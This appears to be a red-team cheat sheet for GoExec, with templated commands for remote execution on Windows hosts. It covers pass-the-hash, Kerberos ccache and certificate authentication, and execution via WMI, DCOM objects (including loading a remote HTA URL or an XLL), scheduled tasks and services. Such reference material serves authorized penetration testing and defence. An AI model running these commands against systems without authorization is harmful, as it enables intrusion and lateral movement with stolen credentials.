# GoExec

## GoExec auth

### Password auth

Dump password auth with GoExec.

GoExec supports WMI, DCOM, SCMR, and Task Scheduler remote execution from Linux with password, hash, Kerberos, AES, ccache, or certificate authentication.

```sh title:"GoExec Dump Password Auth"
goexec $module $method $rhost_name -u "$domain\\$user" -p "$pass" $goexec_exec
```
<!-- cheat
var module = printf 'wmi\ndcom\nscmr\ntsch\n' --- --header 'GoExec module'
var method
var rhost_name
var domain
var user
var pass
var goexec_exec := -c "$command"
var command
-->

### NT hash auth

Dump NT hash auth with GoExec.

Authenticate with an NT hash.

```sh title:"GoExec Dump NT Hash Auth"
goexec $module $method $rhost_name -u "$domain\\$user" -H "$nt_hash" $goexec_exec
```
<!-- cheat
var module = printf 'wmi\ndcom\nscmr\ntsch\n' --- --header 'GoExec module'
var method
var rhost_name
var domain
var user
var nt_hash
var goexec_exec := -c "$command"
var command
-->

### Kerberos ccache auth

Execute kerberos ccache auth with GoExec.

Use an existing ccache for Kerberos authentication.

```sh title:"GoExec Execute Kerberos Ccache Auth"
goexec $module $method $rhost_name -u "$user@$domain" -k --ccache "$ccache_file" --dc "$rhost_ip" $goexec_exec
```
<!-- cheat
import domain_ip
var module = printf 'wmi\ndcom\nscmr\ntsch\n' --- --header 'GoExec module'
var method
var rhost_name
var user
var domain
var ccache_file
var goexec_exec := -c "$command"
var command
-->

### PFX certificate auth

Read PFX certificate auth with GoExec.

Authenticate with a client certificate and private key in PFX form.

```sh title:"GoExec Read PFX Certificate Auth"
goexec $module $method $rhost_name -u "$user@$domain" --pfx "$pfx_file" --pfx-password "$pfx_pass" $goexec_exec
```
<!-- cheat
var module = printf 'wmi\ndcom\nscmr\ntsch\n' --- --header 'GoExec module'
var method
var rhost_name
var user
var domain
var pfx_file
var pfx_pass
var goexec_exec := -c "$command"
var command
-->

## GoExec WMI

### WMI process

Execute WMI process with GoExec.

Create a remote process through `Win32_Process.Create`.

```sh title:"GoExec Execute WMI Process"
goexec wmi proc $rhost_name -u "$domain\\$user" -p "$pass" -e "$remote_exe" -a "$remote_args"
```
<!-- cheat
var rhost_name
var domain
var user
var pass
var remote_exe
var remote_args
-->

### WMI output

Execute WMI output with GoExec.

Fetch command output over SMB and print it to stdout.

```sh title:"GoExec Execute WMI Output"
goexec wmi proc $rhost_name -u "$domain\\$user" -H "$nt_hash" -e cmd.exe -a "/c $command" -o-
```
<!-- cheat
var rhost_name
var domain
var user
var nt_hash
var command
-->

### WMI method call

Execute WMI method call with GoExec.

Call an arbitrary WMI method with JSON arguments.

```sh title:"GoExec Execute WMI Method Call"
goexec wmi call $rhost_name -u "$domain\\$user" -p "$pass" -C "$wmi_class" -m "$wmi_method" -A "$wmi_args_json"
```
<!-- cheat
var rhost_name
var domain
var user
var pass
var wmi_class
var wmi_method
var wmi_args_json
-->

## GoExec DCOM

### MMC20

Execute MMC20 with GoExec.

Execute through the `MMC20.Application` DCOM object.

```sh title:"GoExec Execute MMC20"
goexec dcom mmc $rhost_name -u "$domain\\$user" -H "$nt_hash" -e cmd.exe -a "/c $command" -o-
```
<!-- cheat
var rhost_name
var domain
var user
var nt_hash
var command
-->

### ShellWindows

Spawn ShellWindows with GoExec.

Execute through the ShellWindows DCOM object. This may require an active desktop session.

```sh title:"GoExec Spawn ShellWindows"
goexec dcom shellwindows $rhost_name -u "$domain\\$user" -p "$pass" -e "$remote_exe" -a "$remote_args"
```
<!-- cheat
var rhost_name
var domain
var user
var pass
var remote_exe
var remote_args
-->

### HTAFile URL

Execute HTAFile URL with GoExec.

Load a remote HTA or scriptlet URL through the HTAFile DCOM object.

```sh title:"GoExec Execute HTAFile URL"
goexec dcom htafile $rhost_name -u "$domain\\$user" -H "$nt_hash" --url "$url"
```
<!-- cheat
var rhost_name
var domain
var user
var nt_hash
var url
-->

### Excel XLL

Execute excel XLL with GoExec.

Load an XLL/DLL through remote Excel DCOM.

```sh title:"GoExec Execute Excel XLL"
goexec dcom excel xll $rhost_name -u "$domain\\$user" -H "$nt_hash" --xll "$xll_path"
```
<!-- cheat
var rhost_name
var domain
var user
var nt_hash
var xll_path
-->

## GoExec Task Scheduler

### Create task

Create task with GoExec.

Register a remote task and start it after a short delay.

```sh title:"GoExec Create Task"
goexec tsch create $rhost_name -u "$user@$domain" -H "$nt_hash" --dc "$rhost_ip" -k --task "$task_name" -c "$command"
```
<!-- cheat
import domain_ip
var rhost_name
var user
var domain
var nt_hash
var task_name
var command
-->

### Demand task

Execute demand task with GoExec.

Register a task and demand immediate execution.

```sh title:"GoExec Execute Demand Task"
goexec tsch demand $rhost_name -u "$domain\\$user" -p "$pass" --task "$task_name" -c "$command" -o-
```
<!-- cheat
var rhost_name
var domain
var user
var pass
var task_name
var command
-->

## GoExec SCMR

### Change service command

Execute change service command with GoExec.

Modify an existing service to run a command.

```sh title:"GoExec Execute Change Service Command"
goexec scmr change $rhost_name -u "$domain\\$user" -p "$pass" --service "$service_name" -c "$command"
```
<!-- cheat
var rhost_name
var domain
var user
var pass
var service_name
var command
-->

### Create service

Create service with GoExec.

Create and start a service for command execution.

```sh title:"GoExec Create Service"
goexec scmr create $rhost_name -u "$domain\\$user" -H "$nt_hash" --service "$service_name" -c "$command"
```
<!-- cheat
var rhost_name
var domain
var user
var nt_hash
var service_name
var command
-->
